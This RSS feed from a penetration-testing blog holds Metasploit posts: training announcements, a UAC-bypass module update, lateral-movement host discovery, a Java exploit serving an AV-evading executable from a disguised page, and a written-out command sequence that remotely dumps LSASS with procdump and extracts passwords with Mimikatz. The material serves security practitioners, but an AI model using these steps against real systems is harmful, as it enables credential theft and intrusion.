<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>metasploit on malicious.link</title>
    <link>https://malicious.link/categories/metasploit/</link>
    <description>Recent content in metasploit on malicious.link</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Mon, 13 Jan 2014 14:32:04 -0500</lastBuildDate>
    
        <atom:link href="https://malicious.link/categories/metasploit/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Installing Metasploit Community Edition on Windows 8</title>
      <link>https://malicious.link/post/2014/2014-01-13-installing-metasploit-community-edition-on-windows-8/</link>
      <pubDate>Mon, 13 Jan 2014 14:32:04 -0500</pubDate>
      
      <guid>https://malicious.link/post/2014/2014-01-13-installing-metasploit-community-edition-on-windows-8/</guid>
      <description>&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/a3nzWgUgQO8&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Show URL: &lt;a href=&#34;http://hak5.org/category/episodes/metasploit-minute&#34;&gt;Hak5&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Youtube URL: &lt;a href=&#34;http://www.youtube.com/playlist?list=PLW5y1tjAOzI3n4KRN_ic8N8Qv_ss_dh_F&#34;&gt;YouTube&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Show RSS feed: &lt;a href=&#34;http://gdata.youtube.com/feeds/api/playlists/W5y1tjAOzI3n4KRN_ic8N8Qv_ss_dh_F&#34;&gt;RSS&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Metasploit Minute - Mondays with Mubix - Episode 1</title>
      <link>https://malicious.link/post/2014/2014-01-06-metasploit-minute-mondays-with-mubix/</link>
      <pubDate>Mon, 06 Jan 2014 14:30:08 -0500</pubDate>
      
      <guid>https://malicious.link/post/2014/2014-01-06-metasploit-minute-mondays-with-mubix/</guid>
      <description>&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Show URL: &lt;a href=&#34;http://hak5.org/category/episodes/metasploit-minute&#34;&gt;Hak5&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Youtube URL: &lt;a href=&#34;http://www.youtube.com/playlist?list=PLW5y1tjAOzI3n4KRN_ic8N8Qv_ss_dh_F&#34;&gt;YouTube&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Show RSS feed: &lt;a href=&#34;http://gdata.youtube.com/feeds/api/playlists/W5y1tjAOzI3n4KRN_ic8N8Qv_ss_dh_F&#34;&gt;RSS&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/TCPyoWHy4eA&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool</title>
      <link>https://malicious.link/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/</link>
      <pubDate>Fri, 07 Jun 2013 15:00:08 +0000</pubDate>
      
      <guid>https://malicious.link/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/</guid>
      <description>&lt;p&gt;Mimikatz is now &lt;a href=&#34;https://github.com/rapid7/meterpreter/pull/9&#34;&gt;built into Metasploit&amp;rsquo;s meterpreter&lt;/a&gt;, you can do load mimikatz from the meterpreter prompt, but if you don&amp;rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&amp;rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.&lt;/p&gt;

&lt;p&gt;Mimikatz Minidump: &lt;a href=&#34;http://blog.gentilkiwi.com/securite/mimikatz/minidump&#34;&gt;http://blog.gentilkiwi.com/securite/mimikatz/minidump&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Procdump: &lt;a href=&#34;http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx&#34;&gt;http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Lets start. First we make sure our authentication works against the box and we can look inside of C$ (usually only admins can)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;net use \\TARGETBOXC$ /user:DOMAIN\serviceaccount serviceaccount123
dir \\TARGETBOX\C$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If that works then we want to check that we can all the &amp;ldquo;AT&amp;rdquo; command on the remote host:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;at \\TARGETBOX
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;All set. Next lets prep our workspace on the remote host. We are using the C:\Temp directory.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mkdir \\TARGETBOX\C$\Temp
dir \\TARGETBOX\C$\Temp
copy c:\temp\procdump.exe \\TARGETBOXC$
copy c:\temp\procdump.bat \\TARGETBOXC$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The contents of procdump.bat are:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;@echo off
C:\temp\procdump.exe -accepteula -ma lsass.exe %COMPUTERNAME%_lsass.dmp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I&amp;rsquo;m using the computer name in the memory dump name to help me keep track of where the dump came from, but also help me notice when I&amp;rsquo;ve dumped more than one IP that is actually the same host.&lt;/p&gt;

&lt;p&gt;Next we schedule the task. Use net time to determine the local time for the remote machine.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;net time \\TARGETBOX
at \\TARGETBOX 13:52 C:\Temp\procdump.bat
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pull down the file and clean up:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;dir \\TARGETBOX\C$\Temp
copy \\TARGETBOX\C$\Temp\*lsass.dmp C:\temp\output\
rmdir /s \\TARGETBOX\C$\Temp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On your side the only thing you need to make sure is that you are running Mimikatz on a similar version and architecture you pulled from. Use the following url for reference:&lt;a href=&#34;http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png&#34;&gt;http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Load up the Alpha version of Mimikatz, switch it to minidump mode and you&amp;rsquo;re dumping creds:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mimikatz # sekurlsa::minidump SUPERCOMPUTER_lsass.dmp
Switch to MINIDUMP

mimikatz # sekurlsa::logonPasswords full
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thats it. Password dumping without ever using a &amp;ldquo;Hacker&amp;rdquo; tool on target. Much love Microsoft. And even more to Mimikatz creator &lt;a href=&#34;http://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt; - Benjamin Delpy for both this alpha release and changing his licensing to allow Mimikatz code to be integrated into Meterpreter.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Sessiondump Meterpreter Extension</title>
      <link>https://malicious.link/post/2013/2013-04-08-sessiondump-meterpreter-extension/</link>
      <pubDate>Mon, 08 Apr 2013 09:58:20 +0000</pubDate>
      
      <guid>https://malicious.link/post/2013/2013-04-08-sessiondump-meterpreter-extension/</guid>
      <description>&lt;p&gt;Mimikatz is awesome right, so is WCE. But both have one fatal flaw, even though you can execute them in memory &lt;a href=&#34;https://malicious.link/blog/2012/9/6/completely-in-memory-mimikatz-with-metasploit.html&#34;&gt;{link}&lt;/a&gt; - you still have to have the binaries, remember the command to execute it in memory, and ultimately transfer the entire binary over so that metasploit can do its thing.&lt;/p&gt;

&lt;p&gt;Then along came SessionDump. I only noticed this because someone was tweeting congratulations to someone on writing it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;No blog post or huge Vegas lights talk on it at DefCon or Blackhat. Just posted online in a corner of the Internet:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://www.hsc.fr/ressources/outils/sessiondump/&#34;&gt;http://www.hsc.fr/ressources/outils/sessiondump/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Before we get started lets be clear about one thing. Sessiondump while awesome doesn&amp;rsquo;t do everything that Mimikatz does. However, it does do the feature of mimikatz that I do use the most, the logged on user hash dumping as well as the wdigest clear text password dumping. It does this as a Meterpreter extension that operates using reflective DLL injection. Does that solve our minor issues we had with mimikatz, as of right now, only partially. This code was simply posted online, not in a pull request or submitted to Metasploit in any way. So you still have to have the binary + code. What about the remembering, surely it makes it so I can just tab complete my way to passwords right? Yup, it does, but until/if it is in the Metasploit trunk you will still have to remember how to get it installed (which we will go over in a bit). The final question is yes it does still transfer a complete DLL over to the host same as any of the other extensions (not to disk mind you, just memory),.&lt;/p&gt;

&lt;p&gt;Without further ado lets go ahead and get the file and do a bunch of extracting.Â &lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And finally placing everything in it&amp;rsquo;s correct place, which was nice of the author to make easy by making the archive the same as the Metasploit directory structure:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Cool, everything should be good to go. Lets use this thing. I&amp;rsquo;m using psexec to get a shell but any way you get a windows native meterpreter fine, with one caveat, and its the same as with any of the other aforementioned tools. You need to be Admin (past UAC, w/ SeDebug privilege) or NT\AUTHORITY SYSTEM. Â After that it&amp;rsquo;s cake, load the extension:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Here is the available commands:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And run getHashes:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_8.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;or getwDigestPasswords:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Thats is, you free passwords, YAY&amp;hellip;&lt;/p&gt;

&lt;p&gt;Possible issues you may run into:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;If you are on a x64 box and meterpreter isn&amp;rsquo;t running in a x64 process it will fail saying that it doesn&amp;rsquo;t have the correct version offsets, here is how you can check:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_10.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;x64 system and Meterpreter is x86/win32. Lets find a good process to migrate into and kick it from there. Winlogon isn&amp;rsquo;t the greatest choices since if meterpreter decides to crash it during migration then the system will go down, whereas a service running as SYSTEM will probably just restart if something fails.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201304_sessiondump_11.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;If by any chance you are running it against a system the author hasn&amp;rsquo;t gotten the offsets for. I don&amp;rsquo;t&amp;rsquo; have a screenshot for this one because he covers all the languages I have CMs for, but the author was awesome enough to include a few python scripts that can help you generate the correct offsets. I&amp;rsquo;ll show you by running it on my lsass and widgets.dll files even though he already has this data included in the CSV file that comes with session dump.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Thats all for now folks, may the shells be with you.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Metasploit Mastery @BlackHatEvents USA 2013</title>
      <link>https://malicious.link/post/2013/2013-03-19-metasploit-mastery-blackhatevents-usa-2013/</link>
      <pubDate>Tue, 19 Mar 2013 14:38:36 +0000</pubDate>
      
      <guid>https://malicious.link/post/2013/2013-03-19-metasploit-mastery-blackhatevents-usa-2013/</guid>
      <description>&lt;p&gt;Just a quick post to say that &lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;egypt&lt;/a&gt; and I will be giving Metasploit Mastery twice (2 x 2 day sessions) at BlackHat USA 2013. Come out and get your Metasploit on in Vegas w/ us&lt;/p&gt;

&lt;p&gt;Linky: &lt;a href=&#34;http://www.blackhat.com/us-13/training/metasploit-mastery.html&#34;&gt;http://www.blackhat.com/us-13/training/metasploit-mastery.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Current fill rate of July 27-28 session: &lt;img src=&#34;http://www.blackhat.com/images/us-13/trainbars/July2728MetasploitMastery.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Current fill rate of July 29-30 session: &lt;img src=&#34;http://www.blackhat.com/images/us-13/trainbars/July2930MetasploitMastery.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;EOM&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Metasploit Mastery meets CanSecWest</title>
      <link>https://malicious.link/post/2013/2013-01-25-metasploit-mastery-meets-cansecwest/</link>
      <pubDate>Fri, 25 Jan 2013 16:12:20 +0000</pubDate>
      
      <guid>https://malicious.link/post/2013/2013-01-25-metasploit-mastery-meets-cansecwest/</guid>
      <description>&lt;p&gt;In 2012 @&lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;egypt&lt;/a&gt; and I taught &lt;a href=&#34;https://www.derbycon.com/traning-classes-2012/#metasploit&#34;&gt;Metasploit Mastery&lt;/a&gt; for a day and a half @&lt;a href=&#34;https://twitter.com/derbycon&#34;&gt;DerbyCon&lt;/a&gt; . This was a lot of fun but we had to cram a TON of slides into that short period of time. PLUS we had a CTF at the end where people had to break into a corporate network (virtualized) and sell their shells, data, passwords, or flags to us (egypt and I were acting as opposing countries). You could sell low to one and high to another whatever. Most money at the end wins. (We used a score card with ranges to keep it even)&lt;/p&gt;

&lt;p&gt;We are doubling down on the content being provided and doing a 3 full days @&lt;a href=&#34;https://twitter.com/secwest&#34;&gt;CanSecWest&lt;/a&gt;. You get to learn the nooks and cranies of Metasploit&amp;rsquo;s guts from &lt;em&gt;the&lt;/em&gt; egypt himself, and operational use from me, with a ton mixed in between. I mean, just getting in the room with egypt&amp;rsquo;s beard is worth the price of admission.&lt;/p&gt;

&lt;p&gt;See you there!&lt;/p&gt;

&lt;p&gt;Link: &lt;a href=&#34;http://cansecwest.com/dojos/2013/meta_mastery.html&#34;&gt;http://cansecwest.com/dojos/2013/meta_mastery.html&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>EXE::Custom in Metasploit&#39;s Java Exploits</title>
      <link>https://malicious.link/post/2012/2012-11-19-execustom-in-metasploits-java-exploits/</link>
      <pubDate>Mon, 19 Nov 2012 05:59:10 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-11-19-execustom-in-metasploits-java-exploits/</guid>
      <description>&lt;p&gt;Let me say first off that this isn&amp;rsquo;t the most elegant of ways to accomplish it. It is in the &amp;ldquo;it works for me&amp;rdquo; stage.&lt;/p&gt;

&lt;p&gt;A quick primer on EXE::Custom: This is a setting just like RHOST in Metasploit wherever an EXE is built for Windows payloads. Such as PSEXEC, BypassUAC, etc. It tells Metasploit to ignore all of your payload settings and just use the EXE you have specified. Now this does come at a bit of a cost. If you don&amp;rsquo;t have a handler set up to catch whatever is in your EXE and you have bogus information in your payload settings for your module, Metasploit won&amp;rsquo;t be able to magically determine what you want it to do. So make sure that you either have the payload settings correct (even though it won&amp;rsquo;t use them for the exploit) or set the option &amp;ldquo;DisablePayloadHandler&amp;rdquo; to true and start your own handler somewhere else.&lt;/p&gt;

&lt;p&gt;With that said, the Java Signed Applet attack is one of the most widely used, one problem in the Metasploit module version is that you have no external control (such as EXE::Custom) for the binary that is dropped if you are using a Windows native payload. (I do highly recommend trying out Java Meterpreter, but that it for another post)&lt;/p&gt;

&lt;p&gt;Here is the hack that gets me by until a more elegant solution is thought up by smarter people than I:&lt;/p&gt;

&lt;p&gt;We are going to use the Java Rhino exploit, and this story starts with an undetectable.exe sitting in /tmp/ - How you bypass the AV you are up against is up to you. The first thing we need to do is make a core library change. Yes, this is as scary as it sounds and you should document any time you do so you can revert as needed.&lt;/p&gt;

&lt;p&gt;In your MSF directory open up lib/msf/util/exe.rb - should look something like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Scroll down or search for &lt;code&gt;self.to_jar&lt;/code&gt; - should look something like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Now add &lt;code&gt;exe = File.read(&#39;/path/to/your/evil.exe&#39;)&lt;/code&gt; as demonstrated below:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Cool. We&amp;rsquo;ve made our change, now we have to pull down a jar generated with our evil bin, and the Rhino exploit. We can do that by spinning up Metasploit with our newly editing core library. Load up the Rhino exploit via &lt;code&gt;use exploit/multi/browser/java_rhino&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;One trip up that I messed up even just creating this blog post (and a constant headache in the #Metasploit channel on Freenode) is forgetting to set the TARGET variable in Java exploits. The default payload type being Java. Since we are using a native windows binary we need to specify Windows by setting TARGET 1.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Run the exploit with any settings, since we&amp;rsquo;ll be just pulling out what we need. Then pull down the exploit JAR file with wget:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;(Most java exploits are set to answer ANY .jar extension request with the payload.)&lt;/p&gt;

&lt;p&gt;The HTML to load the JAR is pretty straight forward, but if you&amp;rsquo;ve never seen it before here it is:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Thats it. A very blank page with an exploit in it. We can do better than that:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_8.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Obviously you can do whatever you want with the HTML, mirror a site or what have you. Notice that I&amp;rsquo;ve also changed the name of the JAR. (You can&amp;rsquo;t change the class unless you start making changes to the exploit directly and I wanted to keep this as generically applicable as possible)&lt;/p&gt;

&lt;p&gt;Move the Applet.jar to SuperMario.jar and start up a Web server (for demo using Python&amp;rsquo;s awesome SimpleHTTPServer, but apache will serve as well)&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Don&amp;rsquo;t forget to start up a handler for our now-external exploit:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_10.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Victim views the site:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_11.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And WA-LA! we haz shell:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201211_customejavaexe_12.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Yayâ¦ Game over..&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Finding Admin Access</title>
      <link>https://malicious.link/post/2012/2012-10-31-finding-admin-access/</link>
      <pubDate>Wed, 31 Oct 2012 01:28:22 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-10-31-finding-admin-access/</guid>
      <description>&lt;p&gt;You&amp;rsquo;ve got shell, and a set of credentials but you&amp;rsquo;re coming up empty on what you can do with those credentials. This is especially problematic when you can&amp;rsquo;t get past UAC as you are either in a AlwaysNotify situation or not a local admin.&lt;/p&gt;

&lt;p&gt;(I&amp;rsquo;m not trying to pull some some &amp;ldquo;insert magic here&amp;rdquo; on the assumption of credentials just at the time of this writing I have only just started working (created a blank file) on a post module to do this as your current user, so until then, you need credentials)&lt;/p&gt;

&lt;p&gt;Enter the auxiliary module: &lt;code&gt;auxiliary/admin/smb/check_dir_file&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;First we set up a route as aux modules don&amp;rsquo;t have a &amp;ldquo;SESSION&amp;rdquo; parameter:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Use the module and set our credentials:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Next, set ADMIN$ as we can&amp;rsquo;t guarantee C$ is the primary drive, but ADMIN$ will definitely be the WINDOWS directory. Our RHOSTS is our target range&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;A simple &amp;lsquo;run&amp;rsquo; and away it goes:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;So we can see that our lowly user that doesn&amp;rsquo;t have any chance of bypassing the UAC on his current system can pivot to these other systems (172.16.10.10, and 172.16.10.150) quite easily.&lt;/p&gt;

&lt;p&gt;=============================================================================&lt;/p&gt;

&lt;p&gt;The rest of this has nothing to do about admin access, just some tricks to do it better&lt;/p&gt;

&lt;p&gt;=============================================================================&lt;/p&gt;

&lt;p&gt;As many of you know I&amp;rsquo;m not a huge fan of sending packets I don&amp;rsquo;t need to so instead of just spraying a range (which I doubt would be seen, but why take the chance?)&lt;/p&gt;

&lt;p&gt;[&lt;strong&gt;Update&lt;/strong&gt;: While computer_browser_discovery does lookup all the hosts and sends -more- packets than check_dir_file would, those extra packets are sent at DNS resolvers not into empty space that can be detected by network sensors]&lt;/p&gt;

&lt;p&gt;Enter computer_browser_discovery:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This module does the equivalent of &amp;lsquo;net view&amp;rsquo; to get a list of computers on the domain. You can change the LTYPE to &amp;ldquo;SQL&amp;rdquo; to just get MSSQL boxes but we&amp;rsquo;re going for everything:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see WIN7X86 (the box we are on came up with 0.0.0.0) expected. and the .150 address didn&amp;rsquo;t show up at all as it&amp;rsquo;s not on the domain. So the benefits is that it&amp;rsquo;s quieter on the wire and you probably will find hosts that aren&amp;rsquo;t in your immediate IP range. (Not the case here simply because I don&amp;rsquo;t have a big enough test network). The disadvantages are as with the .150 address you may miss hosts.&lt;/p&gt;

&lt;p&gt;Next we add the found host&amp;rsquo;s IP addresses to a text file (targethosts.txt)&lt;/p&gt;

&lt;p&gt;[because at the time of this writing the computer_browser_discovery module doesn&amp;rsquo;t add the hosts to the MSF database]&lt;/p&gt;

&lt;p&gt;Then use the smb_version module which does a couple things, it verifies that the hosts are there and alive, adds them to the MSF database, and what version of Windows (or samba) they are running:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;(We still have our route set up so this is module is going through our low privilege user still)&lt;/p&gt;

&lt;p&gt;And now we have info in the DB for better targeting:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_8.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Then back in our check_dir_file module we just use the hosts -R to have the database automatically set RHOSTS to the hosts in the database that match your search or alternatively use services -p 445 -R to add all the hosts that you&amp;rsquo;ve found port 445 open (everything smb_version finds will be shown in services)&lt;/p&gt;

&lt;p&gt;One more way you can get hosts is doing reverse lookups of ranges. You can just hit a range you know of, or guess ranges based on the computer_browser_discovery results. You can do this with resolve_ip module (this can be pretty slow on ranges that don&amp;rsquo;t have many hosts):&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_adminaccess_9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;I used the range this blog is hosted on 1) because for some reason my stupid VM wasn&amp;rsquo;t resolving internal stuff 2) To demonstrate that you can use the module to resolve anything, not just internal ranges.&lt;/p&gt;

&lt;p&gt;So to wrap up, we have a ton of ways to find hosts that don&amp;rsquo;t involve traditional scanning (smb_version is the only thing that comes close). And we&amp;rsquo;ve located two hosts that we have the ability to administer. One oddly enough being the domain controller, so don&amp;rsquo;t ever discount the access you already have. Tunnel vision is the pentesters worst enemy.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>BypassUAC got a facelift</title>
      <link>https://malicious.link/post/2012/2012-10-30-bypassuac-got-a-facelift/</link>
      <pubDate>Tue, 30 Oct 2012 20:05:21 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-10-30-bypassuac-got-a-facelift/</guid>
      <description>&lt;p&gt;Dave Kennedy and Kevin Mitnick submitted the &amp;ldquo;bypassuac&amp;rdquo; post module to Metasploit a while back (last DerbyCon?). Which is awesome and they did some fantastic work, but I had a few complaints as probably anyone did who used the module on a somewhat modern network.&lt;/p&gt;

&lt;p&gt;&amp;ldquo;Old&amp;rdquo; module &lt;code&gt;post/windows/escalate/bypassuac&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;I decided to give it a bit of a face lift:&lt;/p&gt;

&lt;p&gt;&amp;ldquo;New&amp;rdquo; local exploit module &lt;code&gt;exploit/windows/local/bypassuac&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;All of the credit for the availability of this module goes to &lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;@egyp7&lt;/a&gt; though, without his epic addition of local exploits to Metasploit the majority of the updates to this module wouldn&amp;rsquo;t be possible.&lt;/p&gt;

&lt;p&gt;Anywho, on to the new features:&lt;/p&gt;

&lt;p&gt;1) You can set any windows payload you want to use now:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;and yes it supports EXE::Custom.&lt;/p&gt;

&lt;p&gt;2) It lets you know if it will be able to bypass the current setting of UAC or not:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Even when you&amp;rsquo;re going overkill with it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;(ASK module if UAC is disabled will just elevate without any kind of user prompt)&lt;/p&gt;

&lt;p&gt;And of course it works as expected if UAC needs bypassing:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

